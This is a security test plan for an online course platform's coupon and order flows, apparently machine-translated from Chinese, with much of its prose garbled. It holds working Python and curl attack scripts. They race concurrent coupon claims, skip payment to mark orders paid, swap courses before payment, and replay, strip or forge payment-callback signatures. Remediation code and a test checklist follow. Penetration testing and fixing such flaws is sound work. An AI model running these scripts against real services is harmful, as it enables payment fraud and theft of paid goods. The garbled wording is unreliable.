# inline lesson Platform - Race ConditionandStatusmachine vulnerability specialitemsTest Plan

> Based on the methodology from 22,132 real WooYun vulnerability cases | Logic Flow Domain(1,679 Case)andFinancial Domain(2,919 Case)

---

## 1. TargetSystembusiness flow process map map

### 1.1 Coupondomain take flow process

```
Statusmachine:
 [not domain take] -> Userpoint attack domain take -> [Checkwhetheralready domain] -> [write inject domain takeRecord] -> [already domain take]

keyCheck-linesdynamic mode(TOCTOU risk point):
 Check(user_id, coupon_id) -> noRecord -> injectRecord
 up Racewindow interface:Checkand inject between no principle sub protect cert
```

### 1.2 lesson process buy buy flow process

```
expected periodStatusmachine:
 [] -> [add injectShopping Cart] -> [Create Order/Pending Payment] -> [initiate initiatePayment] -> [PaymentCallback/Paid] -> [open wild lesson process/Completed]

CancanofNon-methodStatustransfer move:
 [Pending Payment] -> [Completed] # skip throughPaymentDirectopen wild
 [Completed] -> [Pending Payment] # toward return refund serious new exploitusepriority
 [Paid] -> [Refunded] -> lesson process stillCanaccess ask # Refundnot return collectPermission
 [Pending Payment] -> ModifyOrdercontent -> [Paid] # Paymentfirst tamper changeOrder
```

---

## 2. false set(based on WooYun mode match config)

### false set H1:Coupondomain take existinRace Condition(TOCTOU)

| Dimension | content |
|------|------|
| **WooYun mode** | Race Condition/TOCTOU - 266 Case, 74.8% High Risk |
| **Attack Principle** | manyConcurrencyRequestsame timePass"whetheralready domain"Check, averageinwrite injectRecordfirst determine setas"not domain take", CausingSameUserdomain take manyitems |
| **type ratioCase** | WooYun Coupon rate mode:andlinesApplicationSamesingletimesuseuseCoupon(Financial Domain 1,056 Caseinof type sub type) |
| **impact response** | singleUserno limit domain coupon -> Batch exploit -> PlatformDirectfinancial loss |
| **root because** | `SELECT -> determine judge -> INSERT` three stepNon-principle sub, missing Databaselevel unique constraintorDistributed Lock |

### false set H2:Order State MachineCanbe strong make skip transfer

| Dimension | content |
|------|------|
| **WooYun mode** | State-Machine Bypass - 1,391 Case, 65.3% High Risk |
| **Attack Principle** | Direct Call"open wild lesson process"Interfaceortamper changeOrderStatusParameter, skip throughPaymentStep |
| **type ratioCase** | "M1905Movie site value2588Packageonly costs5jiao" - Passbackend console self batch accurateBypassPayment;"114Ticketing site logic flaw used payment timeout to leak sensitive information for tens of thousands of users" - super timeStatusmachine missing flaw |
| **impact response** | avoid feeObtainpaid lesson process, Platformlesson process collect inject return zero |
| **root because** | ServernotValidateStatusPrerequisites, orStatustransfer move logic logic onlyinFrontendcontrol make |

### false set H3:PaymentCallbackCanReplay/forgery

| Dimension | content |
|------|------|
| **WooYun mode** | Order Tampering - 1,227 Case, 74.2% High Risk |
| **Attack Principle** | onetimesSuccessofPaymentCallbackRequest, forDifferentOrderReplay, orforgeryCallbackSignature |
| **type ratioCase** | WooYun Financial Domain:"ReplaySuccessofPayment/Top-UpCallback"asHighfrequencyAttack Vector |
| **impact response** | onetimesreal realPayment -> no limit open wild lesson process |

### false set H4:OrdercontentPaymentafterCantamper change

| Dimension | content |
|------|------|
| **WooYun mode** | Business Rule Bypass - 266 Case |
| **Attack Principle** | CreateLowprice lesson processOrder -> Payment -> inCallbacktoreach firstwillOrderlesson processIDReplaceasHighprice lesson process |
| **type ratioCase** | "Datebao official site business-logic vulnerability allowed buying insurance for free or at an extremely low price" - PaymentAmountandreal actual commerce product not match config |
| **impact response** | Lowprice buy buyHighprice lesson process |

### false set H5:CouponCancrossOrder/stack useuse

| Dimension | content |
|------|------|
| **WooYun mode** | Payment Tampering/discount deduct abuseuse - 1,056 Caseinofsub type |
| **Attack Principle** | SameCouponApplicationtomanyOrder;manyitemsCouponstack use price format 0 |
| **impact response** | lesson process real actualPaymentAmountaszeroorextremeLow |

---

## 3. Test EnvironmentandTool Preparation

### 3.1 Accountaccurate prepare

| Role | number quantity | Purpose |
|------|------|------|
| wild generateAccount | 3 | Concurrencytest/Horizontal Authorization Bypasstest |
| lesson /AdministratorAccount | 1 | vertical verticalPermissiontest |
| newRegistrationAccount | 2 | Coupontimesdomain take test |

### 3.2 Toolclear single

| Tool | Purpose |
|------|------|
| Burp Suite + Turbo Intruder | Request Interception/ConcurrencyRacetest |
| Python `asyncio` + `aiohttp` | self set defineConcurrencytestScript |
| mitmproxy | PaymentCallbackInterceptandReplay |
| curl | fast rateInterfaceValidate |

---

## 4. Test CaseDetailedset plan

### 4.1 Race Conditiontest - Coupondomain take(H1)

#### TC-RACE-01:base foundationConcurrencydomain coupon

**Target:** ValidateSameUserwhether canPassConcurrencyRequestdomain take manyitemslimit domain oneitemsofCoupon

**Prerequisites:**
- User A not domain takeTargetCoupon
- Couponscale ruleas"each person limit domain oneitems"

**Test Steps:**

1. LoginUser A, ObtainValid session/token
2. capture take domain takeCouponof HTTP Request(includeComplete headers/cookies/body)
3. useuseConcurrencyScriptsame timeSend 20 related sameofdomain takeRequest
4. CheckResponse:StatisticsSuccessResponsenumber quantity
5. CheckDatabase/Interface:User A real actual hold hasofthisCouponnumber quantity

**Expected Result:** only 1 RequestSuccess, other 19 Return"already domain take"error

**vulnerability determine set:** 2 oror moreRequestReturnSuccess, orUserhold has 2 itemsor morethisCoupon

**ConcurrencytestScript:**

```python
#!/usr/bin/env python3
"""
CouponRace ConditiontestScript
WooYun mode:TOCTOU(266Case, 74.8%High Risk)
"""

import asyncio
import aiohttp
import time
import json
from collections import Counter

# ===== Configuration domain =====
TARGET_URL = "https://edu-platform.example.com/api/coupon/claim"
CONCURRENT_REQUESTS = 20 # Concurrencynumber, create protocol 10-30
COUPON_ID = "COUPON_001" # TargetCouponID

HEADERS = {
 "Content-Type": "application/json",
 "Authorization": "Bearer <USER_A_TOKEN>", # Replaceasreal actualtoken
 "Cookie": "<USER_A_COOKIE>", # Replaceasreal actualcookie
}

PAYLOAD = {
 "coupon_id": COUPON_ID,
}
# ====================

async def claim_coupon(session: aiohttp.ClientSession, req_id: int,
 barrier: asyncio.Barrier):
 """single domain takeRequest, useuse barrier confirm protectAllprotocol process same time initiate out"""
 await barrier.wait() # Allprotocol processin same step, after same time releaselines
 timestamp = time.time()
 try:
 async with session.post(TARGET_URL, json=PAYLOAD,
 headers=HEADERS, ssl=False) as resp:
 status = resp.status
 body = await resp.text()
 elapsed = time.time() - timestamp
 return {
 "req_id": req_id,
 "status": status,
 "body": body[:500],
 "elapsed_ms": round(elapsed * 1000, 2),
 "timestamp": timestamp,
 }
 except Exception as e:
 return {
 "req_id": req_id,
 "status": -1,
 "body": str(e),
 "elapsed_ms": -1,
 "timestamp": timestamp,
 }

async def main():
 print(f"[*] CouponRace Conditiontest")
 print(f"[*] Target: {TARGET_URL}")
 print(f"[*] Concurrencynumber: {CONCURRENT_REQUESTS}")
 print(f"[*] CouponID: {COUPON_ID}")
 print("-" * 60)

 barrier = asyncio.Barrier(CONCURRENT_REQUESTS)

 connector = aiohttp.TCPConnector(limit=0, # not limit make continuous connect number
 force_close=True, # eachtimesnew create continuous connect, avoid continuous connect repeatuseCausingstringlines)
 async with aiohttp.ClientSession(connector=connector) as session:
 tasks = [claim_coupon(session, i, barrier)
 for i in range(CONCURRENT_REQUESTS)]
 results = await asyncio.gather(*tasks)

 # ===== ResultAnalyze =====
 print("\n[*] RequestResult:")
 status_counter = Counter()
 success_count = 0

 for r in sorted(results, key=lambda x: x["timestamp"]):
 is_success = r["status"] == 200 and "success" in r["body"].lower()
 status_counter[r["status"]] += 1
 if is_success:
 success_count += 1
 flag = "<<< SUCCESS" if is_success else ""
 print(f" [req {r['req_id']:2d}] HTTP {r['status']} | "
 f"{r['elapsed_ms']:7.2f}ms | {flag}")

 print("-" * 60)
 print(f"[*] HTTP Statuscode part deploy: {dict(status_counter)}")
 print(f"[*] Successdomain taketimesnumber: {success_count}")

 if success_count > 1:
 print(f"\n[!!!] Vulnerability Confirmation:existinRace Condition!")
 print(f" UserSuccessdomain take done {success_count} itemsCoupon(limit domain1items)")
 print(f" WooYun mode: TOCTOU Race Condition")
 print(f" Severity: High Risk(participate reference WooYun 266Case, 74.8%High Risk)")
 elif success_count == 1:
 print(f"\n[OK] notDiscoverRace Condition, only 1 timesdomain takeSuccess")
 else:
 print(f"\n[?] noSuccessRequest, pleaseCheckAuthenticationinformationandInterfaceAddress")

if __name__ == "__main__":
 asyncio.run(main())
```

#### TC-RACE-02:manyUserConcurrency coupon(InventoryRace)

**Target:** Validatelimit quantityCoupon(such astotal total 100 items)whether canbe super amount domain take

**Step:**

1. accurate prepare one total quantityas N itemsoflimit quantityCoupon
2. useuse M DifferentUserAccount(M > N)same timeSenddomain takeRequest
3. Checkreal actual initiate release number quantitywhethersuper through N

```python
#!/usr/bin/env python3
"""
limit quantityCouponInventoryRacetest
Validatetotal quantity limit makewhether isprinciple sub operation
"""

import asyncio
import aiohttp
import time

TARGET_URL = "https://edu-platform.example.com/api/coupon/claim"
COUPON_ID = "LIMITED_COUPON_001"
COUPON_TOTAL = 10 # Coupontotal quantity

# accurate prepare manyUserof token(Replaceasreal actual value)
USER_TOKENS = ["Bearer token_user_01",
 "Bearer token_user_02",
 #... accurate prepare 15-20 Usertoken(super throughCoupontotal quantity)]

async def claim_as_user(session, user_idx, token, barrier):
 """as special setUseridentity copy domain take"""
 headers = {
 "Content-Type": "application/json",
 "Authorization": token,
 }
 payload = {"coupon_id": COUPON_ID}

 await barrier.wait()
 ts = time.time()
 try:
 async with session.post(TARGET_URL, json=payload,
 headers=headers, ssl=False) as resp:
 return {
 "user": user_idx,
 "status": resp.status,
 "body": (await resp.text())[:300],
 "ts": ts,
 }
 except Exception as e:
 return {"user": user_idx, "status": -1, "body": str(e), "ts": ts}

async def main():
 n_users = len(USER_TOKENS)
 print(f"[*] InventoryRacetest: {n_users} User {COUPON_TOTAL} itemscoupon")

 barrier = asyncio.Barrier(n_users)
 connector = aiohttp.TCPConnector(limit=0, force_close=True)

 async with aiohttp.ClientSession(connector=connector) as session:
 tasks = [claim_as_user(session, i, token, barrier)
 for i, token in enumerate(USER_TOKENS)]
 results = await asyncio.gather(*tasks)

 success = [r for r in results if r["status"] == 200
 and "success" in r["body"].lower()]
 print(f"\n[*] Successdomain take: {len(success)} / {n_users} User")
 print(f"[*] Coupontotal quantity: {COUPON_TOTAL}")

 if len(success) > COUPON_TOTAL:
 print(f"\n[!!!] Vulnerability Confirmation:Inventorysuper!")
 print(f" initiate release {len(success)} items, super through limit amount {COUPON_TOTAL} items")

if __name__ == "__main__":
 asyncio.run(main())
```

#### TC-RACE-03:serious repeat useuseCouponRace

**Target:** ValidatesingletimesuseuseCouponwhether canPassConcurrencyRequestinmanyOrderinuseuse

```python
#!/usr/bin/env python3
"""
CouponuseuseRacetest
WooYun mode:dual flower(Financial DomainHighfrequencyAttack Vector)
"""

import asyncio
import aiohttp

TARGET_URL = "https://edu-platform.example.com/api/order/apply-coupon"
COUPON_CODE = "SINGLE_USE_CODE"

# expected firstCreatemanyPending PaymentOrder
ORDER_IDS = ["ORDER_001", "ORDER_002", "ORDER_003", "ORDER_004", "ORDER_005"]

HEADERS = {
 "Content-Type": "application/json",
 "Authorization": "Bearer <USER_TOKEN>",
}

async def apply_coupon(session, order_id, barrier):
 payload = {"order_id": order_id, "coupon_code": COUPON_CODE}
 await barrier.wait()
 async with session.post(TARGET_URL, json=payload,
 headers=HEADERS, ssl=False) as resp:
 body = await resp.text()
 return {"order_id": order_id, "status": resp.status, "body": body[:300]}

async def main():
 n = len(ORDER_IDS)
 print(f"[*] Coupondual flower test: 1itemscoupon -> {n} Order")

 barrier = asyncio.Barrier(n)
 connector = aiohttp.TCPConnector(limit=0, force_close=True)

 async with aiohttp.ClientSession(connector=connector) as session:
 tasks = [apply_coupon(session, oid, barrier) for oid in ORDER_IDS]
 results = await asyncio.gather(*tasks)

 success = [r for r in results if r["status"] == 200
 and "success" in r["body"].lower()]
 print(f"[*] CouponSuccessApplicationto {len(success)} Order")

 if len(success) > 1:
 print(f"[!!!] Vulnerability Confirmation:Coupondual flower!singletimesuseusecoupon beusefor {len(success)} Order")
 for s in success:
 print(f" - Order {s['order_id']}")

if __name__ == "__main__":
 asyncio.run(main())
```

---

### 4.2 Statusmachine vulnerability test - lesson process buy buy flow process(H2/H3/H4)

#### TC-STATE-01:skip throughPaymentDirectopen wild lesson process

**WooYun mode:** State-Machine Bypass(1,391 Case, 65.3% High Risk)
**type ratioCase:** Shopping Cart -> Completed(complete all skip throughPayment)

**Test Steps:**

1. correct common flow processCreate Order, RecordOrdernumber
2. not advancelinesPayment, Direct Callthe followingInterface(one by oneAttempt):
 - `POST /api/order/confirm` - pass injectOrdernumber
 - `POST /api/order/complete` - pass injectOrdernumber
 - `PUT /api/order/{id}/status` - body: `{"status": "paid"}`
 - `POST /api/course/enroll` - Directpass lesson processID
3. Checklesson processwhetheralready open wild

```bash
#!/bin/bash
# Statusmachine skip step test - skip throughPaymentDirectConfirmOrder

BASE_URL="https://edu-platform.example.com/api"
TOKEN="Bearer <USER_TOKEN>"
ORDER_ID="<UNPAID_ORDER_ID>"

echo "[*] TC-STATE-01: skip throughPaymentDirectConfirmOrder"
echo "========================================="

# Attempt1: DirectConfirmOrder
echo -e "\n[1] POST /order/confirm"
curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
 -X POST "$BASE_URL/order/confirm" \
 -H "Authorization: $TOKEN" \
 -H "Content-Type: application/json" \
 -d "{\"order_id\": \"$ORDER_ID\"}"

# Attempt2: DirectModifyOrderStatusasPaid
echo -e "\n[2] PUT /order/$ORDER_ID/status -> paid"
curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
 -X PUT "$BASE_URL/order/$ORDER_ID/status" \
 -H "Authorization: $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"status": "paid"}'

# Attempt3: Direct Calllesson process open wildInterface
echo -e "\n[3] POST /course/enroll (BypassOrder)"
curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
 -X POST "$BASE_URL/course/enroll" \
 -H "Authorization: $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"course_id": "<COURSE_ID>"}'

# Validate: Checklesson processwhetheralready open wild
echo -e "\n[*] Validatelesson processStatus:"
curl -s "$BASE_URL/user/courses" \
 -H "Authorization: $TOKEN" | python3 -m json.tool
```

#### TC-STATE-02:PaymentCallbackReplay

**WooYun mode:** Order Tampering(1,227 Case, 74.2% High Risk)

**Test Steps:**

1. complete one entry real realofLowprice lesson processPayment
2. useuse mitmproxy/Burp Payment GatewayCallbackRequest
3. ModifyCallbackinof `order_id` as one notPaymentOrder
4. ReplayModifyafterofCallbackRequest
5. ChecknewOrderwhetherchangeasPaid

```python
#!/usr/bin/env python3
"""
PaymentCallbackReplaytest
WooYun mode:Order Tampering - forDifferentOrderReplaySuccessofPaymentCallback
"""

import requests
import copy
import hashlib

# ===== Configuration =====
CALLBACK_URL = "https://edu-platform.example.com/api/payment/callback"

# from Burp/mitmproxy ofreal realSuccessCallback(Replaceasreal actual value)
ORIGINAL_CALLBACK = {
 "order_id": "PAID_ORDER_001",
 "amount": "99.00",
 "status": "SUCCESS",
 "transaction_id": "TXN_ABC123",
 "sign": "original_signature_here", # Payment GatewaySignature
 "timestamp": "1709712000",
}

# need attack attackofnotPaymentOrder
TARGET_ORDER_IDS = ["UNPAID_ORDER_002",
 "UNPAID_ORDER_003",]
# =================

TOKEN = "Bearer <USER_TOKEN>"

def test_callback_replay():
 print("[*] TC-STATE-02: PaymentCallbackReplaytest\n")

 # test1:principle Replay(CheckIdempotencyness)
 print("[1] principle Replayprinciple initialCallback...")
 resp = requests.post(CALLBACK_URL, json=ORIGINAL_CALLBACK, verify=False)
 print(f" HTTP {resp.status_code}: {resp.text[:200]}")
 if resp.status_code == 200 and "success" in resp.text.lower():
 print(" [!] alert report: CallbackCanbeReplay(missing lessIdempotencyValidate)")

 # test2:Modify order_id afterReplay
 for target_oid in TARGET_ORDER_IDS:
 print(f"\n[2] ReplayCallback, order_id -> {target_oid}")
 tampered = copy.deepcopy(ORIGINAL_CALLBACK)
 tampered["order_id"] = target_oid

 resp = requests.post(CALLBACK_URL, json=tampered, verify=False)
 print(f" HTTP {resp.status_code}: {resp.text[:200]}")

 if resp.status_code == 200 and "success" in resp.text.lower():
 print(f" [!!!] Vulnerability Confirmation: Order {target_oid} be identifier recordasPaid!")
 print(f" CallbackSignaturenotValidateornotand order_id Binding")

 # test3: SignatureField
 print(f"\n[3] SignatureFieldafterSubmit...")
 no_sign = copy.deepcopy(ORIGINAL_CALLBACK)
 no_sign.pop("sign", None)
 resp = requests.post(CALLBACK_URL, json=no_sign, verify=False)
 print(f" HTTP {resp.status_code}: {resp.text[:200]}")
 if resp.status_code == 200:
 print(" [!!!] Vulnerability Confirmation: CallbacknotValidateSignature!")

 # test4:forgerySignature
 print(f"\n[4] forgerySignatureafterSubmit...")
 fake_sign = copy.deepcopy(ORIGINAL_CALLBACK)
 fake_sign["order_id"] = TARGET_ORDER_IDS[0]
 fake_sign["sign"] = hashlib.md5(b"fake").hexdigest()
 resp = requests.post(CALLBACK_URL, json=fake_sign, verify=False)
 print(f" HTTP {resp.status_code}: {resp.text[:200]}")
 if resp.status_code == 200:
 print(" [!!!] Vulnerability Confirmation: forgerySignaturebe connect affected!")

if __name__ == "__main__":
 test_callback_replay()
```

#### TC-STATE-03:OrderStatus toward return refund

**WooYun mode:** State-Machine Bypass - "whether canreverse toward transfer move?(Paid->pending audit)"

```bash
#!/bin/bash
# OrderStatus toward return refund test

BASE_URL="https://edu-platform.example.com/api"
TOKEN="Bearer <USER_TOKEN>"

echo "[*] TC-STATE-03: OrderStatus toward return refund test"
echo "========================================="

# scenario sceneA:CompletedOrder -> Attemptreturn refundtoPending Payment(image serious new useuseCoupon)
COMPLETED_ORDER="<COMPLETED_ORDER_ID>"
echo -e "\n[A] Completed -> Pending Payment"
for status in "pending" "unpaid" "Pending Payment" "0"; do
 echo " Attempt status=$status..."
 curl -s -o /dev/null -w "HTTP %{http_code}" \
 -X PUT "$BASE_URL/order/$COMPLETED_ORDER/status" \
 -H "Authorization: $TOKEN" \
 -H "Content-Type: application/json" \
 -d "{\"status\": \"$status\"}"
 echo ""
done

# scenario sceneB:PaidOrder -> AttemptCancelandRefund(but protect retain lesson process access ask)
PAID_ORDER="<PAID_ORDER_ID>"
echo -e "\n[B] Paid -> Cancel+Refund"
curl -s -w "\nHTTP %{http_code}\n" \
 -X POST "$BASE_URL/order/$PAID_ORDER/cancel" \
 -H "Authorization: $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"reason": "not done"}'

# Validate:lesson processwhetherstill Canas access ask
echo -e "\n[*] Validatelesson process access askPermissionwhetherbe return collect:"
curl -s "$BASE_URL/course/<COURSE_ID>/access" \
 -H "Authorization: $TOKEN"
```

#### TC-STATE-04:Paymentfirst tamper changeOrdercontent

**WooYun mode:** Business Rule Bypass

```python
#!/usr/bin/env python3
"""
PaymentfirstOrdercontent tamper change test
flow process:CreateLowpriceOrder -> ModifyasHighprice lesson process -> asLowprice completePayment
"""

import requests
import json

BASE_URL = "https://edu-platform.example.com/api"
TOKEN = "Bearer <USER_TOKEN>"
HEADERS = {
 "Authorization": TOKEN,
 "Content-Type": "application/json",
}

CHEAP_COURSE_ID = "COURSE_FREE_TRIAL" # avoid fee/Lowprice lesson process
EXPENSIVE_COURSE_ID = "COURSE_VIP_9999" # Highprice lesson process

def test_order_tampering():
 print("[*] TC-STATE-04: Paymentfirst tamper changeOrdercontent\n")

 # Step1:CreateLowprice lesson processOrder
 print("[1] CreateLowprice lesson processOrder...")
 resp = requests.post(f"{BASE_URL}/order/create",
 headers=HEADERS,
 json={"course_id": CHEAP_COURSE_ID})
 order = resp.json()
 order_id = order.get("order_id") or order.get("id")
 amount = order.get("amount", "?")
 print(f" Order {order_id}, Amount: {amount}")

 # Step2:AttemptModifyOrderinoflesson process
 print(f"\n[2] Attemptwilllesson processReplaceasHighprice lesson process {EXPENSIVE_COURSE_ID}...")

 # MethodA:DirectModifyOrder
 resp_a = requests.put(f"{BASE_URL}/order/{order_id}",
 headers=HEADERS,
 json={"course_id": EXPENSIVE_COURSE_ID})
 print(f" MethodA (PUT /order/id): HTTP {resp_a.status_code}")

 # MethodB:PassShopping CartModify
 resp_b = requests.post(f"{BASE_URL}/cart/update",
 headers=HEADERS,
 json={"order_id": order_id,
 "items": [{"course_id": EXPENSIVE_COURSE_ID,
 "quantity": 1}]})
 print(f" MethodB (Shopping CartUpdate): HTTP {resp_b.status_code}")

 # Step3:CheckOrderwhen firstStatus
 print(f"\n[3] CheckOrderwhen first content...")
 resp = requests.get(f"{BASE_URL}/order/{order_id}", headers=HEADERS)
 current = resp.json()
 current_course = current.get("course_id", "?")
 current_amount = current.get("amount", "?")
 print(f" lesson process: {current_course}, Amount: {current_amount}")

 if str(current_course) == str(EXPENSIVE_COURSE_ID) and \
 float(str(current_amount).replace("¥", "")) <= float(str(amount).replace("¥", "")):
 print(f"\n[!!!] Vulnerability Confirmation: lesson process alreadyReplaceasHighprice lesson process, butAmountnot serious algorithm!")
 print(f" principle initialAmount: {amount}, when firstAmount: {current_amount}")
 print(f" WooYun mode: Order Tampering(1,227Case, 74.2%High Risk)")

if __name__ == "__main__":
 test_order_tampering()
```

---

### 4.3 combineRace + Statusmachine array combine attack attack

#### TC-COMBO-01:Concurrent Payment + serious repeat open wild

**Target:** useuseRace Conditiontrigger initiate one entryPaymentforshouldmanytimeslesson process open wild

```python
#!/usr/bin/env python3
"""
array combine attack attack:Concurrencytrigger initiatePaymentCallback -> manytimesopen wildSamelesson process
WooYun mode:Race Condition + State-Machine Bypass
"""

import asyncio
import aiohttp

CALLBACK_URL = "https://edu-platform.example.com/api/payment/callback"
CONCURRENT = 15

# real realPaymentCallbackData(from Burp)
CALLBACK_DATA = {
 "order_id": "ORDER_001",
 "amount": "99.00",
 "status": "SUCCESS",
 "transaction_id": "TXN_REAL_001",
 "sign": "<REAL_SIGN>",
}

async def fire_callback(session, req_id, barrier):
 await barrier.wait()
 async with session.post(CALLBACK_URL, json=CALLBACK_DATA,
 ssl=False) as resp:
 return {
 "req_id": req_id,
 "status": resp.status,
 "body": (await resp.text())[:300],
 }

async def main():
 print(f"[*] TC-COMBO-01: Concurrent PaymentCallbacktest (x{CONCURRENT})")
 barrier = asyncio.Barrier(CONCURRENT)
 connector = aiohttp.TCPConnector(limit=0, force_close=True)

 async with aiohttp.ClientSession(connector=connector) as session:
 tasks = [fire_callback(session, i, barrier) for i in range(CONCURRENT)]
 results = await asyncio.gather(*tasks)

 success = [r for r in results if r["status"] == 200]
 print(f"\n[*] SuccessResponse: {len(success)} / {CONCURRENT}")

 if len(success) > 1:
 print(f"[!!!] Vulnerability Confirmation: Callbackbe handle manage {len(success)} times!")
 print(f" CancanCausing: serious repeat open wild/Balancemanytimesinject account/ part manytimesinitiate release")
 print(f" root because: Callbackhandle manage missing lessIdempotencycontrol make(noDistributed Lock/ one event serviceID)")

if __name__ == "__main__":
 asyncio.run(main())
```

---

## 5. WooYun Case ReferencesandStatistics

### 5.1 Directrelated keyCase

| Casename name | Vulnerability Type | Severity | andversion testofkey connect |
|----------|---------|---------|---------------|
| M1905Movie site value2588Packageonly costs5jiao | Order Tampering/State-Machine Bypass | High Risk | Orderself batch accurateBypassPayment, and TC-STATE-01 forshould |
| 114Ticketing site logic flaw used payment timeout to leak sensitive information for tens of thousands of users | Statusmachine missing flaw | High Risk | super timeStatusunderofabnormal common transfer move, and TC-STATE-03 forshould |
| Datebao official site business-logic vulnerability allowed buying insurance for free or at an extremely low price | Business Rule Bypass | High Risk | Lowprice buy buyHighprice commerce product, and TC-STATE-04 forshould |
| sub a locationSeverelogic logic vulnerability | Business Rule Bypass | High Risk | electronic commerce logic logicBypass, andCoupon/price format vulnerability forshould |
| super level lesson process table some primary business logic logic missing flawCausingall bodyUserreal realNamemobile machineandQQDisclosure | Design Flaw | High Risk | lesson Platformsame type business, set plan layer page missing flaw |

### 5.2 StatisticsDatasupport

| specified identifier | Data | come source |
|------|------|------|
| Race ConditionCasetotal number | 266 | WooYun Logic Flow Domain |
| Race Conditionhigh-risk percentage | **74.8%** | WooYun Datacollect |
| State-Machine BypassCasetotal number | 1,391 | WooYun Logic Flow Domain |
| State-Machine Bypasshigh-risk percentage | **65.3%** | WooYun Datacollect |
| Order TamperingCasetotal number | 1,227 | WooYun Financial Domain |
| Order Tamperinghigh-risk percentage | **74.2%** | WooYun Datacollect |
| Payment BypassCasetotal number | 1,056 | WooYun Financial Domain |
| Payment Bypasshigh-risk percentage | **68.7%** | WooYun Datacollect |
| logic logic vulnerability integer bodyHigh Riskrate | **74.8%** | WooYun Logic Flow Domain 266 Case |
| Financialvulnerability integer bodyHigh Riskrate | **68-83%** | WooYun Financial Domain 2,919 Case |

> **key hole:** Race Condition Case Countonly share 266 (Logic Flow Domainof 15.8%), butHigh Riskrate reach 74.8%, inAlllogic logic vulnerability sub typeinrank nameNo. one.this meaning one existinRace Condition, must CausingSevereafter if.

---

## 6. vulnerabilityPass/Fail Criteriaandimpact response assess assess matrix matrix

| Test ID | vulnerability determine set condition | Severity | Business Impact |
|---------|-------------|---------|---------|
| TC-RACE-01 | Successdomain take > 1 items | **High Risk** | singleUserno limit exploit, Couponbody system |
| TC-RACE-02 | real actual initiate release > limit amount | **High Risk** | Platformsuper amount supplement, Directfinancial loss |
| TC-RACE-03 | CouponApplicationfor > 1 Order | **High Risk** | Coupondual flower, Ordercollect inject loss loss |
| TC-STATE-01 | notPaymentOrderchangeasCompleted/lesson process already open wild | **Severe** | avoid feeObtainpaid lesson process, audit core collect inject loss loss |
| TC-STATE-02 | tamper change afterCallbackbe connect affected | **Severe** | onetimesPaymentno limit open wild, Paymentbody system be attack |
| TC-STATE-03 | CompletedOrderCanreturn refund + lesson process stillCanaccess ask | **High Risk** | Refundnot return collectPermission, resource funds loss loss |
| TC-STATE-04 | lesson process alreadyReplacebutAmountnot change | **High Risk** | Lowprice buy buyHighprice lesson process |
| TC-COMBO-01 | Callbackbe manytimeshandle manage | **Severe** | Balance/ part/lesson process manytimesinject account |

---

## 7. Remediation Recommendation

### 7.1 Race Conditiondefense defense(Coupondomain take)

```sql
-- method plan1:Databaseunique constraint(most simple singleValid)
ALTER TABLE user_coupons ADD UNIQUE INDEX uk_user_coupon (user_id, coupon_id);

-- method plan2:principle sub operation(INSERT... ON DUPLICATE KEY / INSERT IGNORE)
INSERT IGNORE INTO user_coupons (user_id, coupon_id, created_at)
VALUES (#{userId}, #{couponId}, NOW());
-- affected_rows == 1 -> domain takeSuccess
-- affected_rows == 0 -> already domain take through

-- method plan3:limit quantity couponofprinciple sub deduct reduce
UPDATE coupons SET remaining = remaining - 1
WHERE coupon_id = #{couponId} AND remaining > 0;
-- affected_rows == 1 -> Inventorytopup, continue initiate release
```

```python
# method plan4:Redis Distributed Lock(HighConcurrencyscenario scene)
import redis

r = redis.Redis()
lock_key = f"coupon:claim:{user_id}:{coupon_id}"

# SETNX principle sub operation
if r.set(lock_key, "1", nx=True, ex=30): # 30 expired
 try:
 # Executedomain take logic logic
 claim_coupon(user_id, coupon_id)
 finally:
 r.delete(lock_key)
else:
 raise DuplicateClaimError("please serious repeat domain take")
```

### 7.2 Statusmachine defense defense(Orderflow transfer)

```python
# Serverhas limitStatusmachine(Whitelisttransfer change)
VALID_TRANSITIONS = {
 "created": ["pending_payment"],
 "pending_payment": ["paid", "cancelled"],
 "paid": ["enrolled", "refund_pending"],
 "enrolled": ["completed"],
 "refund_pending": ["refunded"],
 "cancelled": [], # final state, notCanagain transfer
 "refunded": [], # final state, notCanagain transfer
 "completed": [], # final state, notCanagain transfer
}

def transition_order(order, new_status):
 current = order.status
 allowed = VALID_TRANSITIONS.get(current, [])
 if new_status not in allowed:
 raise InvalidTransitionError(f"Non-methodStatustransfer move: {current} -> {new_status}, "
 f"allow allowofTargetStatus: {allowed}")
 # Executetransfer move...
```

### 7.3 PaymentCallbackdefense defense

```python
# 1. SignatureValidate(must)
# 2. IdempotencynessValidate(must)
# 3. Amountmatch configValidate(must)

def handle_payment_callback(data):
 # Step 1: ValidateSignature
 if not verify_gateway_signature(data):
 raise SecurityError("SignatureValidateFailure")

 # Step 2: Idempotencyness - Checkwhetheralready handle manage
 if CallbackLog.exists(transaction_id=data["transaction_id"]):
 return {"status": "already_processed"} # IdempotencyReturn

 # Step 3: Amountmatch config
 order = Order.get(data["order_id"])
 if order.amount!= Decimal(data["amount"]):
 raise SecurityError("Amountnot match config")

 # Step 4: StatusValidate
 if order.status!= "pending_payment":
 raise SecurityError(f"OrderStatusabnormal common: {order.status}")

 # Step 5: inevent serviceinprinciple subUpdate
 with db.transaction():
 order.update(status="paid")
 CallbackLog.create(transaction_id=data["transaction_id"])
 enroll_user(order.user_id, order.course_id)
```

---

## 8. testExecuteCheckclear single

- [] **environment environmentConfirm:** intest/expected initiate deploy environment environmentExecute, disable stopDirecttest generate asset environment environment
- [] **Dataprepare copy:** test first prepare copy related keyDatabasetable
- [] **TC-RACE-01:** singleUserConcurrencydomain coupon(20Concurrency)
- [] **TC-RACE-02:** manyUser limit quantity coupon(Usernumber > coupon total quantity)
- [] **TC-RACE-03:** singletimesuseusecouponConcurrencyApplicationtomanyOrder
- [] **TC-STATE-01:** skip step test(skip throughPaymentDirectopen wild)
- [] **TC-STATE-02:** PaymentCallbackReplayandforgery
- [] **TC-STATE-03:** OrderStatus toward return refund
- [] **TC-STATE-04:** Paymentfirst tamper changeOrdercontent
- [] **TC-COMBO-01:** Concurrent PaymentCallback
- [] **ResultRecord:** EachusecasesofRequest/Responseintercept image
- [] **DataValidate:** test afterCheckDatabaseinofreal actualStatus(Balance/coupon number/OrderStatus)
- [] **clear manage:** test complete after return Test Data

---

